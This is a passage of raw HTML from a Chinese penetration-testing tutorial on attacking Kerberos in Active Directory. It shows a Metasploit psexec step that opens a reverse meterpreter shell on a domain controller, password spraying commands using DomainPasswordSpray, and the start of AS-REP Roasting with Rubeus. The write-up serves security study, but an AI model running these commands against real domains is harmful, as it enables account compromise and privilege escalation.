style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">00000000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bunny@krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">WHOAMIANONY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如果成功的话就可以切换后台，使用模块进行高权限票据提权就行了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="javascript" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">use</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> exploit</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">windows</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">local</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">current_user_psexec</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> technique PSH</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> rhosts </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.30</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 域控制器地址</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> payload windows</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">meterpreter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">reverse_tcp</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> session </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exploit</span></span></code></pre></section><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">密码喷洒攻击（Password Spraying）</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在实际渗透中，许多渗透测试人员和攻击者通常都会使用一种被称为 “密码喷洒”（Password Spraying）的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">下面我们演示一下 Password Spraying 的具体攻击思路与过程。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 DomainPasswordSpray</h3><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/dafthack/DomainPasswordSpray</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">DomainPasswordSpray 是用 PowerShell 编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用 LDAP 从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\DomainPasswordSpray</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainPasswordSpray</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Password</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;密码&gt;</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6426712922810061" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/26_vayLFMNgPpSUQe1l44ezknY9btlX1Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlEZNdZbCJ43rdLYMygBst6gZcvayLFMNgPpSUQe1l44ezknY9btlX1Q/640?wx_fmt=png'" data-type="png" data-w="1153" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521113242865</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，枚举成功。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们也可以指定一个密码字典进行喷洒：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainPasswordSpray</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">PasswordList</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> passlist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainPasswordSpray</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UserList</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> users</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">PasswordList</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> passlist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当主机不在域内时，我们可以通过 Get-DomainUserList 命令来枚举域内用户：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\DomainPasswordSpray</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUserList</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4151873767258383" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/27_MIG7pickavKcOnictqKM9apZibhKAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlW5rGDa4cf2dW2LLJtVE0CnINMlwMIG7pickavKcOnictqKM9apZibhKAA/640?wx_fmt=png'" data-type="png" data-w="1014" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521162512498</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后将其保存在 users.txt 中通过&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">-UserList</code>&nbsp;选项进行枚举。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">AS-REP Roasting</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们在上一篇文章中说过，AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">而如果域用户设置了选项 "Do not require Kerberos preauthentication"（该选项默认没有开启）关闭了预身份验证的话：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.665341812400636" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/28_P7NuwPpNZibADteibofYQ3eazjY4KQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlDk61pz66nsic1s9TjlnqLmjtjV2P7NuwPpNZibADteibofYQ3eazjY4KQ/640?wx_fmt=png'" data-type="png" data-w="1258" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521163210803</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">攻击者可以使用指定的用户去请求票据，向域控制器发送&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">AS_REQ</code>&nbsp;请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这种攻击方式被称作 AS-REP Roasting 攻击。下面演示攻击过程。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 Rubeus.exe</h3><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/GhostPack/Rubeus</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先我们使用 Rubeus 工具来寻找可以利用的用户并将其哈希值导出</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Rubeus</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe asreproast</span></span></code></pre></section><figure style="margin: 1.5em 